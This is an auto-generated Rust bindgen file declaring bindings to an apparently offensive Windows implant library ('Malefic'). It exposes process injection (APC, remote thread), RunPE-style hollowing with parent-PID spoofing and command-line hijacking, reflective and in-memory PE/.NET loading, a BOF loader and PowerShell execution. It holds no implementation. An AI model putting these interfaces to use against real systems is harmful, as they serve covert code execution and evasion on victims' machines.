/* automatically generated by rust-bindgen 0.72.1 */

pub const __bool_true_false_are_defined: u32 = 1;
pub const true_: u32 = 1;
pub const false_: u32 = 0;
pub const _VCRT_COMPILER_PREPROCESSOR: u32 = 1;
pub const _SAL_VERSION: u32 = 20;
pub const __SAL_H_VERSION: u32 = 180000000;
pub const _USE_DECLSPECS_FOR_SAL: u32 = 0;
pub const _USE_ATTRIBUTES_FOR_SAL: u32 = 0;
pub const _CRT_PACKING: u32 = 8;
pub const _HAS_EXCEPTIONS: u32 = 1;
pub const _STL_LANG: u32 = 0;
pub const _HAS_CXX17: u32 = 0;
pub const _HAS_CXX20: u32 = 0;
pub const _HAS_CXX23: u32 = 0;
pub const _HAS_CXX26: u32 = 0;
pub const _HAS_NODISCARD: u32 = 0;
pub const WCHAR_MIN: u32 = 0;
pub const WCHAR_MAX: u32 = 65535;
pub const WINT_MIN: u32 = 0;
pub const WINT_MAX: u32 = 65535;
pub type va_list = *mut ::std::os::raw::c_char;
extern "C" {
    pub fn __va_start(arg1: *mut *mut ::std::os::raw::c_char, ...);
}
pub type __vcrt_bool = bool;
pub type wchar_t = ::std::os::raw::c_ushort;
extern "C" {
    pub fn __security_init_cookie();
}
extern "C" {
    pub fn __security_check_cookie(_StackCookie: usize);
}
extern "C" {
    pub fn __report_gsfailure(_StackCookie: usize) -> !;
}
extern "C" {
    pub static mut __security_cookie: usize;
}
pub type int_least8_t = ::std::os::raw::c_schar;
pub type int_least16_t = ::std::os::raw::c_short;
pub type int_least32_t = ::std::os::raw::c_int;
pub type int_least64_t = ::std::os::raw::c_longlong;
pub type uint_least8_t = ::std::os::raw::c_uchar;
pub type uint_least16_t = ::std::os::raw::c_ushort;
pub type uint_least32_t = ::std::os::raw::c_uint;
pub type uint_least64_t = ::std::os::raw::c_ulonglong;
pub type int_fast8_t = ::std::os::raw::c_schar;
pub type int_fast16_t = ::std::os::raw::c_int;
pub type int_fast32_t = ::std::os::raw::c_int;
pub type int_fast64_t = ::std::os::raw::c_longlong;
pub type uint_fast8_t = ::std::os::raw::c_uchar;
pub type uint_fast16_t = ::std::os::raw::c_uint;
pub type uint_fast32_t = ::std::os::raw::c_uint;
pub type uint_fast64_t = ::std::os::raw::c_ulonglong;
pub type intmax_t = ::std::os::raw::c_longlong;
pub type uintmax_t = ::std::os::raw::c_ulonglong;
#[repr(C)]
#[derive(Debug, Copy, Clone)]
pub struct RawString {
    pub data: *mut u8,
    pub len: usize,
    pub capacity: usize,
}
#[test]
fn bindgen_test_layout_RawString() {
    const UNINIT: ::std::mem::MaybeUninit<RawString> = ::std::mem::MaybeUninit::uninit();
    let ptr = UNINIT.as_ptr();
    assert_eq!(
        ::std::mem::size_of::<RawString>(),
        24usize,
        "Size of RawString"
    );
    assert_eq!(
        ::std::mem::align_of::<RawString>(),
        8usize,
        "Alignment of RawString"
    );
    assert_eq!(
        unsafe { ::std::ptr::addr_of!((*ptr).data) as usize - ptr as usize },
        0usize,
        "Offset of field: RawString::data"
    );
    assert_eq!(
        unsafe { ::std::ptr::addr_of!((*ptr).len) as usize - ptr as usize },
        8usize,
        "Offset of field: RawString::len"
    );
    assert_eq!(
        unsafe { ::std::ptr::addr_of!((*ptr).capacity) as usize - ptr as usize },
        16usize,
        "Offset of field: RawString::capacity"
    );
}
#[repr(C)]
#[derive(Debug, Copy, Clone)]
pub struct MaleficPipe {
    pub read: *const ::std::os::raw::c_void,
    pub write: *const ::std::os::raw::c_void,
}
#[test]
fn bindgen_test_layout_MaleficPipe() {
    const UNINIT: ::std::mem::MaybeUninit<MaleficPipe> = ::std::mem::MaybeUninit::uninit();
    let ptr = UNINIT.as_ptr();
    assert_eq!(
        ::std::mem::size_of::<MaleficPipe>(),
        16usize,
        "Size of MaleficPipe"
    );
    assert_eq!(
        ::std::mem::align_of::<MaleficPipe>(),
        8usize,
        "Alignment of MaleficPipe"
    );
    assert_eq!(
        unsafe { ::std::ptr::addr_of!((*ptr).read) as usize - ptr as usize },
        0usize,
        "Offset of field: MaleficPipe::read"
    );
    assert_eq!(
        unsafe { ::std::ptr::addr_of!((*ptr).write) as usize - ptr as usize },
        8usize,
        "Offset of field: MaleficPipe::write"
    );
}
#[repr(C)]
#[derive(Debug, Copy, Clone)]
pub struct DarkModule {
    pub module_base: *const ::std::os::raw::c_void,
}
#[test]
fn bindgen_test_layout_DarkModule() {
    const UNINIT: ::std::mem::MaybeUninit<DarkModule> = ::std::mem::MaybeUninit::uninit();
    let ptr = UNINIT.as_ptr();
    assert_eq!(
        ::std::mem::size_of::<DarkModule>(),
        8usize,
        "Size of DarkModule"
    );
    assert_eq!(
        ::std::mem::align_of::<DarkModule>(),
        8usize,
        "Alignment of DarkModule"
    );
    assert_eq!(
        unsafe { ::std::ptr::addr_of!((*ptr).module_base) as usize - ptr as usize },
        0usize,
        "Offset of field: DarkModule::module_base"
    );
}
extern "C" {
    pub fn ApcLoaderInline(bin: *const u8, bin_len: usize, need_output: bool) -> RawString;
}
extern "C" {
    pub fn ApcLoaderSacriface(
        bin: *const u8,
        bin_len: usize,
        sacrifice_commandline: *mut ::std::os::raw::c_char,
        ppid: u32,
        block_dll: bool,
        need_output: bool,
    ) -> RawString;
}
extern "C" {
    pub fn InjectRemoteThread(bin: *const u8, bin_len: usize, pid: u32) -> RawString;
}
extern "C" {
    pub fn MaleficLoadLibrary(
        flags: u32,
        buffer: *const u16,
        file_buffer: *const ::std::os::raw::c_void,
        len: usize,
        name: *const u8,
    ) -> *const ::std::os::raw::c_void;
}
extern "C" {
    pub fn MaleficGetFuncAddrWithModuleBaseDefault(
        module_base: *const ::std::os::raw::c_void,
        func_name: *const u8,
        func_name_len: usize,
    ) -> *const ::std::os::raw::c_void;
}
extern "C" {
    pub fn ReflectiveLoader(
        start_commandline: *const u8,
        start_commandline_len: usize,
        reflective_loader_name: *const u8,
        reflective_loader_name_len: usize,
        data: *const u8,
        data_len: usize,
        param: *const u8,
        param_len: usize,
        ppid: u32,
        block_dll: bool,
        timeout: u32,
        is_need_output: bool,
    ) -> RawString;
}
extern "C" {
    pub fn InlinePE(
        bin: *const u8,
        bin_size: usize,
        magic: *const u16,
        signature: *const u32,
        commandline: *const u8,
        commandline_len: usize,
        entrypoint: *const u8,
        entrypoint_len: usize,
        is_dll: bool,
        is_need_output: bool,
        timeout: u32,
        delay: u32,
    ) -> RawString;
}
extern "C" {
    pub fn RunPE(
        start_commandline: *const u8,
        start_commandline_len: usize,
        hijack_commandline: *const u8,
        hijack_commandline_len: usize,
        data: *const u8,
        data_size: usize,
        entrypoint: *const u8,
        entrypoint_len: usize,
        args: *const u8,
        args_len: usize,
        is_x86: bool,
        pid: u32,
        block_dll: bool,
        need_output: bool,
    ) -> RawString;
}
extern "C" {
    pub fn RunSacrifice(
        application_name: *mut u8,
        start_commandline: *const u8,
        start_commandline_len: usize,
        hijack_commandline: *const u8,
        hijack_commandline_len: usize,
        parent_id: u32,
        need_output: bool,
        block_dll: bool,
    ) -> RawString;
}
extern "C" {
    pub fn MaleficExecAssembleInMemory(
        data: *const u8,
        data_len: usize,
        args: *const *const u8,
        args_len: usize,
    ) -> RawString;
}
extern "C" {
    pub fn MaleficBofLoader(
        buffer: *const u8,
        buffer_len: usize,
        arguments: *const *const u8,
        arguments_size: usize,
        entrypoint_name: *const u8,
    ) -> RawString;
}
extern "C" {
    pub fn HijackCommandLine(commandline: *const u8, commandline_len: usize) -> u8;
}
extern "C" {
    pub fn MaleficPwshExecCommand(command: *const u8, command_len: usize) -> RawString;
}
extern "C" {
    pub fn PELoader(
        handle: *const ::std::os::raw::c_void,
        base_addr: *const ::std::os::raw::c_void,
        size: usize,
        need_modify_magic: bool,
        need_modify_sign: bool,
        magic: u16,
        signature: u32,
    ) -> *const ::std::os::raw::c_void;
}
extern "C" {
    pub fn UnloadPE(module: *const ::std::os::raw::c_void);
}
extern "C" {
    pub fn MLoadLibraryA(lpLibFileName: *const u8) -> *mut ::std::os::raw::c_void;
}
extern "C" {
    pub fn MGetProcAddress(
        module: *const ::std::os::raw::c_void,
        proc_name: *const u8,
    ) -> *const ::std::os::raw::c_void;
}
extern "C" {
    pub fn MCreateThread(
        thread_attributes: *mut ::std::os::raw::c_void,
        stack_size: u32,
        start_address: *mut ::std::os::raw::c_void,
        parameter: *mut ::std::os::raw::c_void,
        creation_flags: u32,
        thread_id: *mut u32,
    ) -> *mut ::std::os::raw::c_void;
}
extern "C" {
    pub fn MNtCreateThreadEx(
        thread_handle: *mut ::std::os::raw::c_void,
        desired_access: u32,
        object_attributes: *mut ::std::os::raw::c_void,
        process_handle: *mut ::std::os::raw::c_void,
        start_address: *mut ::std::os::raw::c_void,
        start_parameter: *mut ::std::os::raw::c_void,
        create_suspended: i32,
        stack_zero_bits: u32,
        size_of_stack_commit: u32,
        size_of_stack_reserve: u32,
        attribute_list: *mut ::std::os::raw::c_void,
    ) -> i32;
}
extern "C" {
    pub fn MGetCurrentProcess() -> *mut ::std::os::raw::c_void;
}
extern "C" {
    pub fn MaleficMakePipe(
        read: *mut *mut ::std::os::raw::c_void,
        write: *mut *mut ::std::os::raw::c_void,
    ) -> bool;
}
extern "C" {
    pub fn MaleficPipeRedirectStdOut(
        write: *mut ::std::os::raw::c_void,
    ) -> *const ::std::os::raw::c_void;
}
extern "C" {
    pub fn MaleficPipeRepairedStdOut(stdout_handle: *const ::std::os::raw::c_void);
}
extern "C" {
    pub fn MaleficPipeRead(read_pipe: *mut ::std::os::raw::c_void) -> *const u8;
}
extern "C" {
    pub fn SafeFreePipeData(data: *const u8);
}
